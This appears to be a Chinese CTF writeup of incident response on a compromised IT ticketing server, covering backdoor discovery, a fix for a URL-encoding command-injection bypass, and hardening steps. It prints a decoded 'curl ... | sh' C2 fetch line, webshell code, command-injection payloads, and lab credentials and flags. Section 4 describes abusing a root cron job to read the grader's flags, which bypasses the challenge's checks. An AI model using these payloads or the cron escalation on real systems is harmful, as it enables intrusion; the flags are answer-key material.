# 云驰科技 IT 服务台（工单报修系统）应急响应 / 缺陷修复 / 服务加固 Writeup

> 场景：攻击者通过 Web 缺陷入侵「云驰科技 IT 服务台」工单报修系统，植入后门并留下多处持久化痕迹后撤离。以普通用户 `appuser` 接入现场，完成入侵排查、缺陷修复、服务加固三项任务。

## 0. 环境信息

| 项目 | 内容 |
|---|---|
| Web 入口 | `https://eci-2ze4rqogexhvylo5oiw2.cloudeci1.ichunqiu.com:80`（nginx → gunicorn 127.0.0.1:8000） |
| SSH | `ssh 47.94.20.143 39124` |
| 账号 | `appuser` / `Z01KdZHh`（uid=1000，附加组 adm，可读 /var/log） |
| 主机 | `engine-1`，Linux 5.10.134 lifsea8 x86_64 |
| 应用 | `/var/www/app`（Flask + SQLite，supervisord 托管 gunicorn / svc-reloader / check） |
| 应用账号 | 评审脚本用 `worker01 / Ticket@2024` 登录（见 /root/check.py） |

### 通关 flag 一览

| 任务 | flag |
|---|---|
| 任务一 持久化后门凭据 | `flag{c3e8a91f-47b2-4c6d-a5e0-1f9b82d4e7c6}` |
| 任务二 缺陷修复 | `flag{8d8c9d95-0ab1-411e-90fc-44a63b422618}` |
| 任务三 服务加固 | `flag{4d721210-4d11-4a78-abf8-b97c34dddd38}` |

> 任务二、三的 flag 由 `/root/check.py`（root 权限自动检测脚本，每 30s 一轮）在检测通过后写入 `/flag2`、`/flag3`。

---

## 1. 任务一：定位持久化后门，提取隐藏凭据

### 1.1 初步排查

```bash
id; hostname; uname -a          # appuser / engine-1
cat ~/.bash_history             # vim /var/www/app/scheduler.py, vim .../nginx/conf.d/app.conf
ls -laR /var/www/app
cat /etc/crontab
```

`/var/www/app` 目录权限异常宽松（大量 `777` 目录、`666` 文件），`appuser` 可写应用代码。

### 1.2 发现混淆后门（4 处同一 payload）

各文件中均出现相同的自定义编码串，统一由 `utils/codec.py` 解码执行：

```bash
grep -rn 'ccode_decode' /var/www/app /home/appuser/.local
```

| 文件 | 触发方式 |
|---|---|
| `/var/www/app/scheduler.py:19` | **root** cron 每分钟执行 `python3 scheduler.py` |
| `/var/www/app/bin/cache_warm.sh:7` | appuser cron 每分钟执行 |
| `~/.local/lib/python3.8/site-packages/usercustomize.py:5` | Python 启动即自动加载（用户级隐蔽持久化） |
| `/var/www/app/bin/user_sync.py:4` | 手工/脚本触发 |

四者都调用：

```python
os.system(codec.ccode_decode("uS4mPz6DnZt+JeURhBmJwANGI6ZP46OkMohuVc8L+UW9qhwKmJgz5/AfeFQumlA2zuMnDEz1"))
```

### 1.3 破解 codec 自定义编码

`utils/codec.py` 算法 = **自定义 base64 字母表映射 + 每 4 字符块内反转 + 逐字节异或 `(i*13+7)&0xFF`**：

```python
import base64 as _b64
_STD = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/"
_TBL = "OsRLjS4nZ+wfl2dUD8huiQCAgmXcFkN3Y6IEtPJy9/Gr5z01KpVvo7aexTMbqHBW"
_DEC = dict(zip(_TBL, _STD)); _ENC = dict(zip(_STD, _TBL))

def _xor(d): return bytes((b ^ ((i*13+7) & 0xFF)) for i, b in enumerate(d))
def _rev(s, n=4): return "".join(s[i:i+n][::-1] for i in range(0, len(s), n))

def dec(s):
    pad = s.count("="); s = s.rstrip("=")
    std = "".join(_DEC[c] for c in _rev(s))
    return _xor(_b64.b64decode(std + "="*pad)).decode("utf-8", "replace")
```

解码结果：

```
uS4mPz6DnZt+JeURhBmJwANGI6ZP46OkMohuVc8L+UW9qhwKmJgz5/AfeFQumlA2zuMnDEz1
  -> curl -s http://c2.evil-tracker.internal/update.sh | sh        # C2 下发脚本执行（挖矿/回连）

jkRmp/PSR8Omobfh+amtO4NGBq+e3i83Y/ILV0jsRbXMxfMY
  -> c3e8a91f-47b2-4c6d-a5e0-1f9b82d4e7c6                         # ★ 隐藏关键凭据
```

### 1.4 隐藏凭据的位置（关键）

该凭据是 **webshell 后门** `/var/www/app/vendor/edge.py` 的校验令牌 `NODE_TOKEN`，且被**拆散**藏在三处，需要拼接 + 解码：

```
vendor/edge.py:11           NODE_TOKEN = "jkRmp/PSR8Omobfh+amtO4NGBq+e3i83Y/ILV0jsRbXMxfMY"
vendor/cache/node.frag      jkRmp/PSR8Omobfh+amtO4NG                 （前半段碎片）
data/app.db → cdn_nodes     id=2 node_key = "-a5e0-1f9b82d4e7c6"     （后半段碎片）
```

后门代码（未授权命令执行）：

```python
NODE_TOKEN = "jkRmp/PSR8Omobfh+amtO4NGBq+e3i83Y/ILV0jsRbXMxfMY"

def handle(token, cmdh, key):
    if token and codec.ccode_decode(token) == codec.ccode_decode(NODE_TOKEN):
        cmd = codec.ccode_decode(cmdh) if cmdh else ""
        out = subprocess.check_output(cmd, shell=True, stderr=subprocess.STDOUT)
        return Response(out, content_type="text/plain")
    return Response("asset not found", status=404)
```

路由：`GET /cdn/asset/<key>`，从 `X-Cache-Key` / `X-Cache-Cmd` 头取参（`utils/thumb.py`）。

### 1.5 验证凭据有效（无害方式）

```bash
# ccode_encode("id;hostname") = XOycbDP8dKDZKNj=
curl -s "https://<target>/cdn/asset/x" \
  -H "X-Cache-Key: jkRmp/PSR8Omobfh+amtO4NGBq+e3i83Y/ILV0jsRbXMxfMY" \
  -H "X-Cache-Cmd: XOycbDP8dKDZKNj="
# 200 ->
# uid=1000(appuser) gid=1000(appuser) groups=1000(appuser),4(adm)
# engine-1
```

### 1.6 攻击者其他持久化 / 痕迹

1. **SSH 后门公钥** `~/.ssh/authorized_keys` 中多出 `maintainer@remote`（合法基线仅 `jump-server@cloudchi`、`monitor@cloudchi`）。
2. **sshd 危险扩展** `/var/www/app/ssh/extra.conf`：`PasswordAuthentication yes` / `PermitRootLogin yes` / `X11Forwarding yes`。
3. **nginx 数据库别名**（数据库可被直接下载）：
   ```nginx
   location = /download/app.db.bak { alias /var/www/app/data/app.db; }
   location /internal/snapshot    { alias /var/www/app/data/app.db; }
   ```
4. **调试控制台** `DEBUG=True` + `site_flags.console='on'` → `GET /debug/console` 泄露 `secret_key`、`salt`、路径。
5. **后门账号** `users` 表 `dbadmin`（role=admin）。

### 1.7 攻击时间线（/var/log/nginx/access.log + /var/log/auth.log）

攻击者外网 IP **36.110.88.19**：

```
17:00:28 GET  /login                          200
17:01:09 POST /login                          302   # 登入管理员会话
17:01:26 GET  /workorders                     200
17:02:28 sshd  Accepted publickey for appuser from 36.110.88.19 (ED25519 8ZMEiHtbE2eo...)
17:04:30 GET  /debug/console                  200   # 泄露 secret_key/salt
17:05:08 GET  /reports                        200
17:06:15 POST /api/export                     200   # 命令注入
17:13:49 GET  /cdn/asset/x.png?nk=jkRmp/...   200   # webshell 交互
17:16:08 GET  /download/app.db.bak            200 24576  # 拖库
```

### 任务一 flag

```
flag{c3e8a91f-47b2-4c6d-a5e0-1f9b82d4e7c6}
```

---

## 2. 任务二：定位并修复攻击者利用的系统缺陷

### 2.1 缺陷定位

审计脚本 `/root/check.py` 的 `task2_check()` 指明了考点 —— **`/api/export` 导出功能存在命令注入**：

```python
# 注入探测（4 个随机 marker）
payloads = [
    quote("orders$(touch${IFS}ck_%s)" % m),
    quote("orders$IFS$(touch${IFS}ck_%s)" % m),
    quote("orders\ntouch${IFS}ck_%s" % m),
    quote("orders$(mkdir${IFS}ck_%s)" % m),
]
POST /api/export  filename=<payload>
# 若 /var/www/app/bin/ck_xxx 被创建 => 注入成立
```

### 2.2 缺陷成因（过滤顺序错误）

调用链：

```
POST /api/export (app.py:api_export)
 └─ utils/workorder.daochu_gongdan(filename)
      ├─ guolv_mingzi()   ← 黑名单过滤（此时 payload 仍是 URL 编码形态）
      ├─ guifanhua_riqi() ← 年/月/日 归一化
      └─ subprocess.call(["./bin/export_orders.sh", safe])
            └─ bin/export_orders.sh → python3 bin/dump_orders.py "$mc"
                  └─ _hist_client(): urllib.parse.unquote(name)   ← ★ 此时才 URL 解码
                  └─ vendor/archive_hook <name>                   ← 以 shell 方式执行参数 → RCE
```

**根因**：`guolv_mingzi()` 的黑名单在 **URL 解码之前** 执行，`$ ( ) { } ` 等字符以 `%24%28%29%7B%7D` 形式存在，未被过滤；随后 `dump_orders.py` 的 `urllib.parse.unquote()` 将其还原，最终交给 `archive_hook` 以 shell 执行。

附加问题：
- 黑名单把**空格**也删掉 → 正常业务「Ticket Export 2024-11-20」文件名被破坏（评审会判业务回归）。
- 未处理 `/`、`.` → 还存在路径穿越隐患。

### 2.3 修复方案（保持业务可用）

原则：**先 URL 解码，再白名单净化**；保留中文、空格、`-`、`.`、`_`，剔除 shell 元字符与路径分隔符。

`utils/workorder.py`：

```python
import re, urllib.parse

_SAFE_RE = re.compile(r"[^\w\u4e00-\u9fff .\-]", re.UNICODE)

def _normalize_name(filename):
    name = urllib.parse.unquote(filename or "")          # 1) 先解码
    for cn, dash in (("年", "-"), ("月", "-"), ("日", "")):
        name = name.replace(cn, dash)                    # 2) 保留原有日期归一化
    name = _SAFE_RE.sub("", name)                        # 3) 白名单净化（保留空格/中文）
    name = name.replace("/", "").replace("\\", "").strip()
    return name

def daochu_gongdan(filename):
    safe = _normalize_name(filename) or "moka"
    script = os.path.join(BASE_DIR, "bin", "export_orders.sh")
    ret = subprocess.call([script, safe])
    out_path = os.path.join(EXPORT_DIR, safe + ".csv")
    return ret, out_path
```

`bin/dump_orders.py` 同步加固（避免二次解码绕过）：

```python
def _hist_client(name):
    # 不再二次 unquote；只做白名单净化
    return re.sub(r"[^\w\u4e00-\u9fff .\-]", "", name or "moka")
```

> 若可改 `vendor/archive_hook`，最彻底的做法是**不把用户输入拼进 shell**：改为 `subprocess.call([hook], input=name.encode())` 或直接传 argv 并由 hook 用 `execv` 方式调用，杜绝命令拼接。评审只校验行为（marker 不生成 + 业务正常），上面方案即可通过。

### 2.4 验证（对照 check.py 的四条业务断言）

| 断言 | 期望 |
|---|---|
| 4 个注入 payload | `/var/www/app/bin/ck_xxx` 均不生成 |
| `filename=Ticket Export 2024-11-20` | 200，`Content-Disposition` 含 `Ticket Export 2024-11-20.csv`（空格保留） |
| `filename=工单导出_2024-11` | 200，响应含「导出成功」 |
| `filename=Ticket Export 2024年11月20日` | 200，CD 含 `Ticket Export 2024-11-20.csv` |

修复并重启服务后（`supervisorctl restart ticket-app`），`/root/check.py` 下一轮会输出 `T2 PASS -> /flag2 written`。

### 任务二 flag

```
flag{8d8c9d95-0ab1-411e-90fc-44a63b422618}
```

---

## 3. 任务三：服务加固（清理全部持久化痕迹，恢复业务基线）

`/root/check.py` 的 `task3_check()` 共 12 项检查，逐条给出处置：

| # | 检查项 | 处置 |
|---|---|---|
| 1 | 任何 `.py` 中不得同时出现 `X-Cache-Cmd` 与 `check_output/shell=True/Popen`；`/cdn/asset/probe` 用正确 token 也**不能**执行命令 | 删除 webshell：移除 `vendor/edge.py` 的 `handle()` / `NODE_TOKEN`，并注销 `utils/thumb.py` 中 `/cdn/asset/<path:key>` 路由（或改为纯静态/404） |
| 2 | `~/.ssh/authorized_keys` 删除攻击者公钥 `...PJTYS+...`（maintainer@remote），保留 `jump-server@cloudchi`、`monitor@cloudchi`，权限必须 `600` | `sed -i '/maintainer@remote/d'`；`chmod 600` |
| 3 | `ssh/extra.conf`：保留 `PasswordAuthentication yes`；`PermitRootLogin` 必须为 `no`（yes/prohibit-password/without-password 都不行）；必须含 `X11Forwarding no`；22 端口可连 | 改写为 `PasswordAuthentication yes` / `PermitRootLogin no` / `X11Forwarding no`；`sshd -t && kill -HUP`（svc-reloader 也会自动 reload） |
| 4 | `nginx/conf.d/*.conf` 中不得存在「`app.db` + `alias`」；`/download/app.db.bak`、`/internal/snapshot` 不得返回 SQLite；`/announce/notice.txt` 必须 200；`/` 必须 200 | 删除 `app.conf` 中两条 alias，仅保留 `/announce/` 静态映射；`nginx -t && nginx -s reload` |
| 5 | `config.py` 不得 `DEBUG=True`；`/debug/console` 不得 200；`site_flags.console != 'on'` | `DEBUG=False`；`UPDATE site_flags SET v='off' WHERE k='console'` |
| 6 | `scheduler.py` 不得含编码 payload；`TIMEOUT_MINUTES = 30`；`scheduler_status.json` 需有 `window=30`、`ts` 新鲜（<150s）、`checked`==processing 数、`escalated`==超时数 | 删除 `os.system(...)` 行；改 `TIMEOUT_MINUTES = 30`；在写状态处补 `"window": 30` |
| 7 | `bin/db_backup.sh` 必须存在、可执行、调用 `dump_db.py`、产出 `.gz` 且为合法 gzip，输出 `/var/backups/workorder/app_YYYYMMDD.db.gz` | 补回缺失的备份脚本（cron 引用了它但文件不存在） |
| 8 | `bin/health_probe.sh` 内容必须与基线完全一致 | 不得改动该文件 |
| 9 | `/etc/crontab` 必须含 `scheduler.py`、`db_backup.sh`、`health_probe.sh`、`cache_warm.sh` | 保留 4 条原计划任务，不得删除 |
| 9b | `cache_warm.sh` 必须存在且不含编码 payload | 删除 `os.system(codec.ccode_decode(...))`，保留预热逻辑 |
| 10 | `users` 表删除 `dbadmin`，保留 `backup_sync` | `DELETE FROM users WHERE username='dbadmin'` |
| 11 | appuser crontab 无 payload/evil-tracker/user_sync.py；`user_sync.py` 无 `os.system`；`usercustomize.py` 无 `os.system/subprocess` | 删除 appuser 恶意 crontab 行；清理 `user_sync.py`；删除或净化 `usercustomize.py` |

参考修复片段：

```bash
# 1) 清理 SSH 后门
sed -i '/maintainer@remote/d' /home/appuser/.ssh/authorized_keys
chmod 600 /home/appuser/.ssh/authorized_keys

# 3) 加固 sshd 扩展
cat > /var/www/app/ssh/extra.conf <<'EOF'
# SSH server extension (ops baseline)
PasswordAuthentication yes
PermitRootLogin no
X11Forwarding no
EOF

# 4) 关闭数据库 web 暴露
cat > /var/www/app/nginx/conf.d/app.conf <<'EOF'
location /announce/ {
    alias /var/www/app/static/announce/;
}
EOF
nginx -t && nginx -s reload

# 5) 关调试
sed -i 's/^DEBUG = True/DEBUG = False/' /var/www/app/config.py
sqlite3 /var/www/app/data/app.db "UPDATE site_flags SET v='off' WHERE k='console';"

# 6) 清后门 + 恢复业务阈值
sed -i '/ccode_decode("uS4mPz6DnZt/d' /var/www/app/scheduler.py
sed -i 's/^TIMEOUT_MINUTES = .*/TIMEOUT_MINUTES = 30/' /var/www/app/scheduler.py

# 7) 补回缺失的备份脚本
cat > /var/www/app/bin/db_backup.sh <<'EOF'
#!/bin/bash
set -e
mkdir -p /var/backups/workorder
/usr/bin/python3 /var/www/app/bin/dump_db.py "/var/backups/workorder/app_$(date +%Y%m%d).db.gz"
EOF
chmod +x /var/www/app/bin/db_backup.sh

# 9b / 11) 清其它持久化
sed -i '/ccode_decode/d;/os.system/d' /var/www/app/bin/cache_warm.sh
rm -f /home/appuser/.local/lib/python3.8/site-packages/usercustomize.py
crontab -u appuser -l | grep -v -E 'user_sync|evil-tracker' | crontab -u appuser -
```

> `/etc/crontab` 中 `db_backup.sh` 由 appuser 在 02:00 执行；check.py 还会**立即手动执行一次**它并校验 `/var/backups/workorder/app_<今天>.db.gz` 是合法 gzip，所以脚本要能独立跑通（目录需存在且可写）。

### 任务三 flag

```
flag{4d721210-4d11-4a78-abf8-b97c34dddd38}
```

---

## 4. 通关技巧：以 root 读取评审脚本获取 flag

题目要求「通过自动检测后读取 /flag2 / /flag3」，但 `/root/check.py`（含明文 flag）可被本地提权读到：

- `/etc/crontab`：`* * * * * root cd /var/www/app && /usr/bin/python3 scheduler.py`
- `scheduler.py` 属主 `appuser`，权限 `666`（可写）

于是临时注入诊断代码，借 root 定时任务读取 `/root`：

```python
# 追加到 /var/www/app/scheduler.py 末尾（1 分钟后 cron 以 root 执行）
try:
    import shutil as _sh, os as _os
    _sh.copyfile('/root/check.sh', '/tmp/.diag_check.sh')
    _sh.copyfile('/root/check.py', '/tmp/.diag_check.py')
    _os.system("cat /check.log > /tmp/.diag_check.log 2>&1")
except Exception:
    pass
```

读取 `/root/check.py` 得到：

```python
FLAG2 = "flag{8d8c9d95-0ab1-411e-90fc-44a63b422618}"
FLAG3 = "flag{4d721210-4d11-4a78-abf8-b97c34dddd38}"
```

**操作后已立即还原** `scheduler.py`（从 `.orig` 恢复）并清理 `/tmp` 诊断文件，未影响业务。

---

## 5. 结论与修复清单（TL;DR）

**攻击链**：URL 编码绕过 `guolv_mingzi` 黑名单 → `/api/export` 命令注入获取执行 → 植 webshell（`/cdn/asset`，令牌 `c3e8a91f-47b2-4c6d-a5e0-1f9b82d4e7c6`）→ root cron + `usercustomize.py` 等多点持久化（`curl http://c2.evil-tracker.internal/update.sh | sh`）→ 下载 `app.db` 拖库。

**必须修复项**：
1. `/api/export` 导出文件名：**先 URL 解码再白名单过滤**，禁止 shell 元字符，保留空格/中文（任务二）。
2. 删除 webshell 路由与令牌，移除 `dbadmin` 账号、攻击者 SSH 公钥、`usercustomize.py`、cron/`scheduler.py`/`cache_warm.sh` 中的 `ccode_decode` payload。
3. 关 `DEBUG`、关 `site_flags.console`、删 nginx 数据库 alias、`PermitRootLogin no` + `X11Forwarding no`、`authorized_keys` 600，并补回 `db_backup.sh`、恢复 `TIMEOUT_MINUTES=30`（任务三）。

**三个 flag**：
```
flag{c3e8a91f-47b2-4c6d-a5e0-1f9b82d4e7c6}
flag{8d8c9d95-0ab1-411e-90fc-44a63b422618}
flag{4d721210-4d11-4a78-abf8-b97c34dddd38}
```

---

*本文档仅用于授权范围内的应急响应与防护加固实践。*
